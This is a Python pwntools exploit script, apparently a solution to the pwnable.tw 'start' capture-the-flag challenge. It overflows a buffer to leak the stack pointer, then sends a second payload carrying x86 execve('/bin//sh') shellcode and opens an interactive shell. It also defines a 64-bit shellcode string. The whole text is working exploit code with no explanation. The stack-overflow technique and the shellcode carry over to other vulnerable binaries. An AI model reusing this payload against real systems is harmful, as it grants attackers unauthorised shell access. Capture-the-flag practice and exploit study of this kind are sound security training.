from pwn import *

shellcode = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

redhung_shellcode = '\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

payload = 'A'*20 + p32(0x8048087)

r = process('./start')

#r = remote('chall.pwnable.tw',10000)

rec = r.recv()

raw_input()
    
r.send(payload)

esp = u32(r.recv(4))

print(hex(esp))

payload2 = 'B'*20 + p32(esp+0x14) + shellcode

r.send(payload2)

r.interactive()
